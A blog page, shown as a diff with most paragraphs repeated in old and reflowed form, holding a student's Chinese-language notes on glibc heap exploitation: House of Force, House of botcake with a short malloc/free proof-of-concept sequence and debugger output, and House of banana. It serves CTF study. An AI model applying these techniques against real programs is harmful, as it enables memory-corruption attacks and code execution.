+<li><p>top_chunk.size &gt;= MINSIZE</p></li>
+<li><p>top_chunk.size &lt; chunk_size + MINSIZE</p></li>
 <li><p>top_chunk.prev_inuse == 1</p>
 <ul>
-<li>第一点中说的0xfe0要变为0xfe1 </li>
-</ul>
-</li>
+<li>第一点中说的0xfe0要变为0xfe1</li>
+</ul></li>
 </ol>
-<h2 id="8-2-House-of-Force-HOF"><a href="#8-2-House-of-Force-HOF" class="headerlink" title="[8-2] House of Force (HOF)"></a>[8-2] House of Force (HOF)</h2><h3 id="8-2-1-概述"><a href="#8-2-1-概述" class="headerlink" title="[8-2-1] 概述"></a>[8-2-1] 概述</h3><p>House of Force 是通过 topchunk 来实现任意地址写的操作。</p>
-<p>具体来说，我们先修改 topchunk 的 size 域，接着用 malloc(c_size) 从 topchunk 切割一个 chunkF，在切割前，通过构造 malloc chunkF 时的 c_size，能改变 main_arena 中指向 topchunk 的指针为任意值，从而在切割时能在任意地址申请一个 chunk，进而实现任意地址写。</p>
-<h3 id="8-2-2-具体原理"><a href="#8-2-2-具体原理" class="headerlink" title="[8-2-2] 具体原理"></a>[8-2-2] 具体原理</h3><ul>
-<li><p>从 topchunk 申请 chunk 的具体实现是这样的，其中的代码可以这样理解(我没读源码，只是从应用角度逆推原理):</p>
+<h2 id="house-of-force-hof">[8-2] House of Force (HOF)</h2>
+<h3 id="概述-7">[8-2-1] 概述</h3>
+<p>House of Force 是通过 topchunk 来实现任意地址写的操作。</p>
+<p>具体来说，我们先修改 topchunk 的 size 域，接着用 malloc(c_size) 从
+topchunk 切割一个 chunkF，在切割前，通过构造 malloc chunkF 时的
+c_size，能改变 main_arena 中指向 topchunk
+的指针为任意值，从而在切割时能在任意地址申请一个
+chunk，进而实现任意地址写。</p>
+<h3 id="具体原理">[8-2-2] 具体原理</h3>
 <ul>
-<li><p>⚠注：本段代码的数据全为 unsigned，也就是说，我们要申请的 chunk 的 size 即 nb 会被转化为无符号，topchunk 的 size 也是无符号的</p>
-</li>
-<li><p>victim: 获取指向目标 chunk 的指针，在这是 topchunk</p>
-</li>
-<li><p>chunksize(victim): 获取 victim 指向的 chunk 的大小</p>
-</li>
-<li><p>nb: chunk 的实际大小，malloc(size) 时 nb = request2size(size) <code>这个地方我也没搞清楚，主要有的时候nextchunk的prev_size域也被拿来当作chunk的一部分，就导致我不是很清楚对齐这一块怎么做的，后面仔细读一下源码再来订正</code></p>
-</li>
-<li><p>chunk_at_offset(victim, nb): return(victim + nb)</p>
-</li>
-</ul>
-</li>
+<li><p>从 topchunk 申请 chunk
+的具体实现是这样的，其中的代码可以这样理解(我没读源码，只是从应用角度逆推原理):</p>
+<ul>
+<li><p>⚠注：本段代码的数据全为 unsigned，也就是说，我们要申请的 chunk 的
+size 即 nb 会被转化为无符号，topchunk 的 size 也是无符号的</p></li>
+<li><p>victim: 获取指向目标 chunk 的指针，在这是 topchunk</p></li>
+<li><p>chunksize(victim): 获取 victim 指向的 chunk 的大小</p></li>
+<li><p>nb: chunk 的实际大小，malloc(size) 时 nb = request2size(size)
+<code>这个地方我也没搞清楚，主要有的时候nextchunk的prev_size域也被拿来当作chunk的一部分，就导致我不是很清楚对齐这一块怎么做的，后面仔细读一下源码再来订正</code></p></li>
+<li><p>chunk_at_offset(victim, nb): return(victim + nb)</p></li>
+</ul></li>
 </ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>House of Force 逻辑如下：</p>
 </blockquote>
-<p>首先通过堆溢出之类的手段，改变 topchunk 的 size 域为 -1，即0xffffffffffffffff</p>
-<p>在 <code>chunkFakealloc(size)</code> 时，通过构造 size（由于<code>nb = request2size(size)</code>,所以构造 nb 的本质就是构造 size），切割程序会运行到如下代码</p>
+<p>首先通过堆溢出之类的手段，改变 topchunk 的 size 域为
+-1，即0xffffffffffffffff</p>
+<p>在 <code>chunkFakealloc(size)</code> 时，通过构造
+size（由于<code>nb = request2size(size)</code>,所以构造 nb
+的本质就是构造 size），切割程序会运行到如下代码</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br></pre></td></tr></table></figure>
-<p>此时，remainder 会被赋值为 victim + nb，而下一行代码 <code>av-&gt;top = remainder</code> 使得 main_arena 中指向 topchunk 的指针被修改</p>
-<p>值得注意的是，若 nb 为负数，victim + nb 会溢出，从而将 victim 修改为比 victim 自己指向的地址更低的地址。</p>
-<p>也就是说，通过构造 nb，我们可以将 av-&gt;top 改写为 <code>Any Address</code></p>
-<p>而通过再一次的 <code>chunkNewalloc(nb)</code>，我们就可以在 <code>Any Address</code> 处申请一个 chunk，进而实现任意地址写.</p>
-<p>总而言之，在改变 topchunk 的 size 域为 -1 之后，只要我们能够精心构造 <code>malloc(nb)</code> 时的 nb，就可以实现任意地址写。</p>
+<p>此时，remainder 会被赋值为 victim + nb，而下一行代码
+<code>av-&gt;top = remainder</code> 使得 main_arena 中指向 topchunk
+的指针被修改</p>
+<p>值得注意的是，若 nb 为负数，victim + nb 会溢出，从而将 victim
+修改为比 victim 自己指向的地址更低的地址。</p>
+<p>也就是说，通过构造 nb，我们可以将 av-&gt;top 改写为
+<code>Any Address</code></p>
+<p>而通过再一次的 <code>chunkNewalloc(nb)</code>，我们就可以在
+<code>Any Address</code> 处申请一个 chunk，进而实现任意地址写.</p>
+<p>总而言之，在改变 topchunk 的 size 域为 -1 之后，只要我们能够精心构造
+<code>malloc(nb)</code> 时的 nb，就可以实现任意地址写。</p>
 <p>那么接下来的问题很显然，如何构造 nb ，也就是如何构造 size？</p>
 <blockquote>
 <p>size 的构造</p>
 </blockquote>
-<p>malloc 的过程中会遇到如下检查，<code>req</code>就是我们申请的 chunk 的大小，就是前文提到的 request2size的参数</p>
+<p>malloc 的过程中会遇到如下检查，<code>req</code>就是我们申请的 chunk
+的大小，就是前文提到的 request2size的参数</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MINSIZE = 2 * SIZE_SZ</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure>
-<p>其中，<code>SIZE_SZ</code> 在 64 位是 0x08，32 位为 0x04，因此 <code>MINSIZE</code> 在 64 位中是 0x10，32 位为 0x08</p>
-<p>由于 -2 * MINSIZE 被转化为了无符号数，拿 64 位举例，req 很难超过 0xfffffffffffffff0 这么大的数字，所以这个检测是很好绕过的，或者说根本不用 care 这个检测。</p>
-<p>接下来，<code>req</code>会经过如下函数，转化为要申请的 chunk 的 真实 size，也就是 nb</p>
+<p>其中，<code>SIZE_SZ</code> 在 64 位是 0x08，32 位为 0x04，因此
+<code>MINSIZE</code> 在 64 位中是 0x10，32 位为 0x08</p>
+<p>由于 -2 * MINSIZE 被转化为了无符号数，拿 64 位举例，req 很难超过
+0xfffffffffffffff0
+这么大的数字，所以这个检测是很好绕过的，或者说根本不用 care
+这个检测。</p>
+<p>接下来，<code>req</code>会经过如下函数，转化为要申请的 chunk 的 真实
+size，也就是 nb</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure>
-<p>其中，<code>MALLOC_ALIGN_MASK</code> 在 64 位是 0xF 即 1111b，32位为 0x7 即 111b.</p>
+<p>其中，<code>MALLOC_ALIGN_MASK</code> 在 64 位是 0xF 即 1111b，32位为
+0x7 即 111b.</p>
 <p><code>这里有点没想明白 request2size 的过程，我先假设在 malloc(size) 时，nb = request2size(req) = request2size(size)</code></p>
-<p>由于 nb 都是对齐的，所以我们可以不用考虑 <code>&amp; ~MALLOC_ALIGN_MASK</code>，所以 size = req = nb - SIZE_SZ - MALLOC_ALIGN_MASK</p>
+<p>由于 nb 都是对齐的，所以我们可以不用考虑
+<code>&amp; ~MALLOC_ALIGN_MASK</code>，所以 size = req = nb - SIZE_SZ -
+MALLOC_ALIGN_MASK</p>
 <p>至此，我们构造出了 size，HOF结束.</p>
-<h2 id="8-3-House-of-botcake"><a href="#8-3-House-of-botcake" class="headerlink" title="[8-3] House of botcake"></a>[8-3] House of botcake</h2><blockquote>
-<p>libc: 2.29 - </p>
+<h2 id="house-of-botcake">[8-3] House of botcake</h2>
+<blockquote>
+<p>libc: 2.29 -</p>
 </blockquote>
-<h3 id="8-3-1-概述"><a href="#8-3-1-概述" class="headerlink" title="[8-3-1] 概述"></a>[8-3-1] 概述</h3><p>由于 libc 2.29 之后加入了 tcachebin 检查机制，所以 tcachebin double free 变得没有那么好利用</p>
-<p>但由于放入 unsortedbin 中的 chunk，再被 free 进 tcachebin 的时候检测相当薄弱</p>
-<p>所以我们可以先把 chunk free 进 unsortedbin，再 free 进 tcachebin，当我们切割 unsortedbin 时就能修改 tcachebin 里重叠的 chunk 的 fd/bk，造成 tcachebin poisoning</p>
-<h3 id="8-3-2-POC"><a href="#8-3-2-POC" class="headerlink" title="[8-3-2] POC"></a>[8-3-2] POC</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    malloc(<span class="number">0x80</span>) <span class="comment"># idx0-6: tcache | idx7,8:unsorted</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># idx9: 防止 unsortedbin 与 topchunk 合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) <span class="comment"># idx0-6: tcache</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># chunk7 后向合并 chunk8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 tcachebin[0x80] 取出一个 chunk，此时 tcachebin 链只剩六个 chunk</span></span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把本在 unsortedbin 中的 chunk8 放入 tcachebin</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 chunk7,8 切割，但实际上已经覆盖了 tcachebin chunk8 的 fd/bk 指针了</span></span><br><span class="line">malloc(<span class="number">0xa0</span>) </span><br></pre></td></tr></table></figure>
-<h3 id="8-3-3-一些疑问"><a href="#8-3-3-一些疑问" class="headerlink" title="[8-3-3] 一些疑问"></a>[8-3-3] 一些疑问</h3><p>不构造 chunk 7，直接把 chunk8 放进 unsortedbin 再放进 tcachebin 中是完全可行的，但当我切割 chunk8 时就会报错 <code>malloc(): unsorted double linked list corrupted\n</code></p>
+<h3 id="概述-8">[8-3-1] 概述</h3>
+<p>由于 libc 2.29 之后加入了 tcachebin 检查机制，所以 tcachebin double
+free 变得没有那么好利用</p>
+<p>但由于放入 unsortedbin 中的 chunk，再被 free 进 tcachebin
+的时候检测相当薄弱</p>
+<p>所以我们可以先把 chunk free 进 unsortedbin，再 free 进
+tcachebin，当我们切割 unsortedbin 时就能修改 tcachebin 里重叠的 chunk 的
+fd/bk，造成 tcachebin poisoning</p>
+<h3 id="poc-1">[8-3-2] POC</h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    malloc(<span class="number">0x80</span>) <span class="comment"># idx0-6: tcache | idx7,8:unsorted</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># idx9: 防止 unsortedbin 与 topchunk 合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) <span class="comment"># idx0-6: tcache</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># chunk7 后向合并 chunk8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 tcachebin[0x80] 取出一个 chunk，此时 tcachebin 链只剩六个 chunk</span></span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把本在 unsortedbin 中的 chunk8 放入 tcachebin</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 chunk7,8 切割，但实际上已经覆盖了 tcachebin chunk8 的 fd/bk 指针了</span></span><br><span class="line">malloc(<span class="number">0xa0</span>) </span><br></pre></td></tr></table></figure>
+<h3 id="一些疑问">[8-3-3] 一些疑问</h3>
+<p>不构造 chunk 7，直接把 chunk8 放进 unsortedbin 再放进 tcachebin
+中是完全可行的，但当我切割 chunk8 时就会报错
+<code>malloc(): unsorted double linked list corrupted\n</code></p>
 <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x55dd5ca32690</span> —▸ <span class="number">0x55dd5ca32570</span> —▸ <span class="number">0x55dd5ca324e0</span> —▸ <span class="number">0x55dd5ca32450</span> —▸ <span class="number">0x55dd5ca323c0</span> —▸ <span class="number">0x55dd5ca32330</span> —▸ <span class="number">0x55dd5ca322a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted] <span class="comment">// 或许跟这里有关系？</span></span><br><span class="line"><span class="attr">FD</span>: <span class="number">0x55dd5ca32680</span> —▸ <span class="number">0x55dd5ca32570</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="attr">BK</span>: <span class="number">0x55dd5ca32680</span> —▸ <span class="number">0x55dd5ca32010</span> ◂— <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
-<p>目前猜测是: 直接把 chunk8 放进 tcachebin 会导致原本存在 chunk8 fd/bk 处的 &amp;main_arena+88 被替换，导致 malloc 错误</p>
-<h2 id="8-4-House-of-banana"><a href="#8-4-House-of-banana" class="headerlink" title="[8-4] House of banana"></a>[8-4] House of banana</h2><p>具体细节可以看这篇<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/180765.html">文章</a></p>
-<h3 id="8-4-1-概述"><a href="#8-4-1-概述" class="headerlink" title="[8-4-1] 概述"></a>[8-4-1] 概述</h3><p>当程序显式调用<code>exit()</code>函数时，程序会通过<code>exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ()</code>这条调用链调用 <code>array[i]()</code>。</p>
-<p>而 <code>array[i]()</code> 是通过 <code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code> 定位的</p>
-<p>通过 largebin attack，我们可以篡改<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>指针，将其值修改为我们可以控制的堆地址，</p>
-<p>而通过在堆上伪造一个 link_map 结构体，我们可以欺骗程序，使其执行 <code>array[i]()</code> 时执行在结构体里放入的提权函数，进而提权</p>
-<h3 id="8-4-2-POC"><a href="#8-4-2-POC" class="headerlink" title="[8-4-2] POC"></a>[8-4-2] POC</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># largebin attack 修改 _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 fake chunk</span></span><br></pre></td></tr></table></figure>
-<h3 id="8-4-3-如何构造-fake-chunk"><a href="#8-4-3-如何构造-fake-chunk" class="headerlink" title="[8-4-3] 如何构造 fake_chunk?"></a>[8-4-3] 如何构造 fake_chunk?</h3><p>见 <a href="https://heygap.github.io/2024/02/15/Pwn%20-%20IO_File%20and%20ld.so%20exploit%20summary/#more">Pwn - IO_File and ld.so exploit summary</a></p>
-<h2 id="8-5-House-of-pig"><a href="#8-5-House-of-pig" class="headerlink" title="[8-5] House of pig"></a>[8-5] House of pig</h2><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-268245.htm#msg_header_h3_2">https://bbs.kanxue.com/thread-268245.htm#msg_header_h3_2</a></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://heygap.github.io">HeyGap</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://heygap.github.io/posts/56319.html">http://heygap.github.io/posts/56319.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://heygap.github.io" target="_blank">HeyGap's_Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Heap/">Heap</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/cover9.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/20963.html" title="Math Knowledge Summary"><img class="cover" src="/img/cover6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Math Knowledge Summary</div></div><div class="info-2"><div class="info-item-1"> 总结一下计算机中的数学相关内容，便于后续调用    [0] 目录 数学算法  [模乘]  [1-1-1 蒙哥马利算法]     密码学  Stream Cipher  1-1 RC4   Block Cipher  2-1 tea/xtea/xxtea      [1] MATH[1-1] 模乘[1-1-1] 蒙哥马利算法蒙哥马利算法能够提高类似模幂运算的速度而实现的，主要是因为蒙哥马利算法巧妙地避免了大量模运算（除法），极大地降低了运算时间，下面介绍如何减少x*y mod N的模运算数目。 首先，蒙哥马利算法引入了REDC函数，该函数以大数T，模数N，模数N的逆元的负数N’和整数R（如果N为素数，R一般选取$2^{n_bit}$，这样就可以在整除前提下用移位运算代替除法运算，也就是将下面代码第三行的整除运算换成移位运算）作为输入，在不使用模运算的情况下输出$TR^{-1} mod N$。该函数减少了模运算的数目，同时将T的蒙哥马利形式恢复成了普通形式。该函数的低效版python实现如下： 123456def REDC(R, N, N_inverse, T):    m =...</div></div></div></a><a class="pagination-related" href="/posts/47197.html" title="Pwn - Shellcode Summary"><img class="cover" src="/img/cover1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Pwn - Shellcode Summary</div></div><div class="info-2"><div class="info-item-1"> Shellcode 也是十分核心的技术🤔    Manuallinux 系统调用号表 manual: pwntools.shellcraft [0] 目录 编写 shellcode shellcode 板子 现有工具 板子   shellcode restrictions &amp; bypass (限制与绕过) Length restrictions (长度约束) seccomp 禁用 alphanumeric shellcode (字母+数字构成)   例题 参考资料  [1] 编写 shellcode[1-1] shellcode 板子 exploit-db  Shellcodes database for study cases(已停止更新)  这个虽然停更了但是挺好用的，很适合找一些 length restrictions 的 shellcode    [1-2] 现有工具[1-2-1] Pwntools[1-2-1-1] shellcraft Manual  速成 (更多请 RTFM 或查看 [1-3] )   1234# arch: i386 / amd64#...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/61241.html" title="Pwn - Format String Summary"><img class="cover" src="/img/cover10.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-21</div><div class="info-item-2">Pwn - Format String Summary</div></div><div class="info-2"><div class="info-item-1"> 总结一下格式化字符串漏洞，便于后续调用    原理 &amp; 工具原理 本质是利用 printf(string) 任意地址读写 记录一下常用的格式  123456fmt    :        标准作用       ||           常用方式——————————————————————————————————————————————————————————————%p     :     输出栈上的内容     |  (读) 找偏移\pie_base\canary%s     :   输出地址指向的内容   ||     (读) 泄露libc_base%hhn   :   修改地址指向的byte   |        (写) 任意地址写%hn/%n : 修改地址指向的2/4bytes |        (写) 任意地址写 工具: Pwntools - fmtstr_payloadPwntools - class fmtstr  源码见上述链接或文章末尾的 Appendix  fmtstr是一个类，我们只需要用其中的 fmtstr_payload 来构造我们的...</div></div></div></a><a class="pagination-related" href="/posts/62959.html" title="comp - 2023第七届蓝帽杯初赛Pwn-takeway-wp"><img class="cover" src="/img/cover8.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-26</div><div class="info-item-2">comp - 2023第七届蓝帽杯初赛Pwn-takeway-wp</div></div><div class="info-2"><div class="info-item-1"> 学艺不精...对于"读/写函数对指针的利用"没那么敏感（    0xff 说在前面下文EXP中，leak堆地址的部分需要”伪爆破”，如果报错的话多运行两三次脚本，直到heap_addr为四字节时即可成功运行题目地址下载口令: 7c9pe6 0x00 Exploitations tcachebin libc2.31  tcachebin poisoning 版本判断 tcache有key混淆，则是2.31以上(不包含2.31) tcache有doublefree检测，则是2.28以上 有tcache，则是2.26及以上     UAF 利用题目提供的堆表+puts/read进行任意地址读写  0x01  反汇编修改    首先进行一个反汇编的读     trick: IDA中对变量按Y键可以改变变量类型  alloc: strcspn是从字符串中返回不含“所查找字符”的子字符串的长度delete: 指针未置零，一眼UAFmodify 0x02  分析与思路构造 分析部分     分析alloc:...</div></div></div></a><a class="pagination-related" href="/posts/27539.html" title="comp - 2023SICTF-Pwn-baby_heap-wp"><img class="cover" src="/img/cover3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-22</div><div class="info-item-2">comp - 2023SICTF-Pwn-baby_heap-wp</div></div><div class="info-2"><div class="info-item-1"> baby一点都不baby...houseoforange+unsortedbinattack  0x00  逆向分析 main函数很简单，1申请2编辑3打印，但是没有free，google’no free pwn’了解到有可能是houseoforange add函数，两个约束（1. 最多申请32个chunk 2. chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin attack或者unsortedbin attack来打（但这里没有free，就导致fastbin很难利用） edit函数 show函数，只打印了8个字节就很难受  0x01  思路分析 我们肯定是要实现“leak libc”和“Any Address Write” leak libc 思路1：unsortedbin...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">HeyGap</div><div class="author-info-description">An undergraduate student of Cybersecurity at SDU.</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HeyGap"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/HeyGap" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2310769056@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客，主要用来记录一些学习笔记和生活感悟。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0-%E7%9B%AE%E5%BD%95"><span class="toc-text">[0] 目录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Patchelf%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">[1] Patchelf的使用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E7%A1%AE%E8%AE%A4libc"><span class="toc-text">[1-1] 确认libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-libc-%E5%8C%85%E7%9A%84%E4%B8%8B%E8%BD%BD"><span class="toc-text">[1-2] libc 包的下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-patch-elf%E6%96%87%E4%BB%B6"><span class="toc-text">[1-3] patch elf文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E6%81%A2%E5%A4%8D-debug-symbol"><span class="toc-text">[1-4] 恢复 debug symbol</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-1-patchelf-list-%E4%B8%AD%E6%9C%89%E7%9B%B8%E5%85%B3%E5%8C%85"><span class="toc-text">[1-4-1] patchelf list 中有相关包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-2-list-%E4%B8%AD%E6%B2%A1%E6%9C%89%E7%9B%B8%E5%85%B3%E5%8C%85"><span class="toc-text">[1-4-2] list 中没有相关包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 